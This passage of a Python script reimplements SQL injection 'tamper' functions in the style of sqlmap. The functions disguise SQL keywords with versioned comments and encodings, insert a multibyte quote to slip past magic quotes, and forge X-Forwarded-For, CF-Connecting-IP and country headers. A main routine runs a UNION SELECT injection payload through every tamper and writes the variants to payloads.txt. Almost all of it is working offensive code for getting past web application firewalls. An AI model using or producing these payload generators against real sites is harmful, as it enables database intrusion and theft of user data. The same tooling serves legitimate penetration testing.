                _ = "LEFT(%s,1)" % (match.group(1))
            else:
                _ = "LEFT(RIGHT(%s,%d),1)" % (match.group(1), 1 - pos)

            retVal = retVal.replace(match.group(0), _)

    return retVal

def tamper_symboliclogical(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)\bAND\b", "%26%26", re.sub(r"(?i)\bOR\b", "%7C%7C", payload))

    return retVal

def tamper_unionalltounion(payload, **kwargs):

    return payload.replace("UNION ALL SELECT", "UNION SELECT") if payload else payload

def tamper_unmagicquotes(payload, **kwargs):

    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in xrange(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            _ = re.sub(r"(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2", "", retVal)
            if _ != retVal:
                retVal = _
                retVal += "-- -"
            elif not any(_ in retVal for _ in ('#', '--', '/*')):
                retVal += "-- -"
    return retVal

def tamper_uppercase(payload, **kwargs):

    retVal = payload

    if payload:
        for match in re.finditer(r"[A-Za-z_]+", retVal):
            word = match.group()

            if word.upper() in keywords:
                retVal = retVal.replace(word, word.upper())

    return retVal

def tamper_varnish(payload, **kwargs):

    headers = kwargs.get("headers", {})
    headers["X-originating-IP"] = "127.0.0.1"
    return payload

def tamper_versionedkeywords(payload, **kwargs):

    def process(match):
        word = match.group('word')
        if word.upper() in keywords:
            return match.group().replace(word, "/*!%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=[^\w(]|\Z)", process, retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal

def tamper_versionedmorekeywords(payload, **kwargs):
 
    def process(match):
        word = match.group('word')
        if word.upper() in keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal

def randomIP():
    octets = []

    while not octets or octets[0] in (10, 172, 192):
        octets = random.sample(xrange(1, 255), 4)

    return '.'.join(str(_) for _ in octets)

def tamper_xforwardedfor(payload, **kwargs):
    
    headers = kwargs.get("headers", {})
    headers["X-Forwarded-For"] = randomIP()
    headers["X-Client-Ip"] = randomIP()
    headers["X-Real-Ip"] = randomIP()
    headers["CF-Connecting-IP"] = randomIP()
    headers["True-Client-IP"] = randomIP()

    # Reference: https://developer.chrome.com/multidevice/data-compression-for-isps#proxy-connection
    headers["Via"] = "1.1 Chrome-Compression-Proxy"

    # Reference: https://wordpress.org/support/topic/blocked-country-gaining-access-via-cloudflare/#post-9812007
    headers["CF-IPCountry"] = random.sample(('GB', 'US', 'FR', 'AU', 'CA', 'NZ', 'BE', 'DK', 'FI', 'IE', 'AT', 'IT', 'LU', 'NL', 'NO', 'PT', 'SE', 'ES', 'CH'), 1)[0]

    return payload

def encode(payload = ""):
    payloadList = {}
    payloadList['0eunion']=tamper_0eunion(payload)
    payloadList['apostrophemask']=tamper_apostrophemask(payload)
    payloadList['apostrophenullencode']=tamper_apostrophenullencode(payload)
    payloadList['appendnullbyte']=tamper_appendnullbyte(payload)
    payloadList['base64encode']=tamper_base64encode(payload)
    payloadList['between']=tamper_between(payload)
    payloadList['binary']=tamper_binary(payload)
    payloadList['bluecoat']=tamper_bluecoat(payload)
    payloadList['chardoubleencode']=tamper_chardoubleencode(payload)
    payloadList['charencode']=tamper_charencode(payload)
    payloadList['charunicodeencode']=tamper_charunicodeencode(payload)
    payloadList['charunicodeescape']=tamper_charunicodeescape(payload)
    payloadList['commalesslimit']=tamper_commalesslimit(payload)
    payloadList['commentbeforeparentheses']=tamper_commentbeforeparentheses(payload)
    payloadList['concat2concatws']=tamper_concat2concatws(payload)
    payloadList['dunion']=tamper_dunion(payload)
    payloadList['equaltolike']=tamper_equaltolike(payload)
    payloadList['equaltorlike']=tamper_equaltorlike(payload)
    payloadList['escapequotes']=tamper_escapequotes(payload)
    payloadList['greatest']=tamper_greatest(payload)
    payloadList['hex2char']=tamper_hex2char(payload)
    payloadList['htmlencode']=tamper_htmlencode(payload)
    payloadList['ifnull2casewhenisnull']=tamper_ifnull2casewhenisnull(payload)
    payloadList['ifnull2ifisnull']=tamper_ifnull2ifisnull(payload)
    payloadList['informationschemacomment']=tamper_informationschemacomment(payload)
    payloadList['least']=tamper_least(payload)
    payloadList['luanginx']=tamper_luanginx(payload)
    payloadList['misunion']=tamper_misunion(payload)
    payloadList['modsecurityversioned']=tamper_modsecurityversioned(payload)
    payloadList['modsecurityzeroversioned']=tamper_modsecurityzeroversioned(payload)
    payloadList['overlongutf8more']=tamper_overlongutf8more(payload)
    payloadList['overlongutf8']=tamper_overlongutf8(payload)
    payloadList['percentage']=tamper_percentage(payload)
    payloadList['plus2concat']=tamper_plus2concat(payload)
    payloadList['plus2fnconcat']=tamper_plus2fnconcat(payload)
    payloadList['schemasplit']=tamper_schemasplit(payload)
    payloadList['space2comment']=tamper_space2comment(payload)
    payloadList['space2dash']=tamper_space2dash(payload)
    payloadList['space2hash']=tamper_space2hash(payload)
    payloadList['space2morecomment']=tamper_space2morecomment(payload)
    payloadList['space2mssqlblank']=tamper_space2mssqlblank(payload)
    payloadList['space2mssqlhash']=tamper_space2mssqlhash(payload)
    payloadList['space2mysqlblank']=tamper_space2mysqlblank(payload)
    payloadList['space2mysqldash']=tamper_space2mysqldash(payload)
    payloadList['space2plus']=tamper_space2plus(payload)
    payloadList['space2randomblank']=tamper_space2randomblank(payload)
    payloadList['sp_password']=tamper_sp_password(payload)
    payloadList['substring2leftright']=tamper_substring2leftright(payload)
    payloadList['symboliclogical']=tamper_symboliclogical(payload)
    payloadList['unionalltounion']=tamper_unionalltounion(payload)
    payloadList['unmagicquotes']=tamper_unmagicquotes(payload)
    payloadList['varnish']=tamper_varnish(payload)
    payloadList['uppercase']=tamper_uppercase(payload)
    payloadList['lowercase']=tamper_lowercase(payload)
    payloadList['versionedkeywords']=tamper_versionedkeywords(payload)
    payloadList['versionedmorekeywords']=tamper_versionedmorekeywords(payload)
    payloadList['xforwardedfor']=tamper_xforwardedfor(payload) 
    payloadList['space2morehash']=tamper_space2morehash(payload)
    payloadList['randomcase']=tamper_randomcase(payload)
    payloadList['randomcomments']=tamper_randomcomments(payload)
    payloadList['multiplespaces']=tamper_multiplespaces(payload)
    payloadList['halfversionedmorekeywords']=tamper_halfversionedmorekeywords(payload)
    
    return payloadList

if __name__ == "__main__":
    # Change Payload	
    payload = "' union select user(); -- -"

    f = open("find.txt", "w")
    for item in encode(payload).items():
        f.write(item[0] + "\n" + item[1] + "\n\n")
    f.close()
    
    f = open("payloads.txt", "w")
    for item in encode(payload).items():
        f.write(item[1] + "\n")
    f.close()
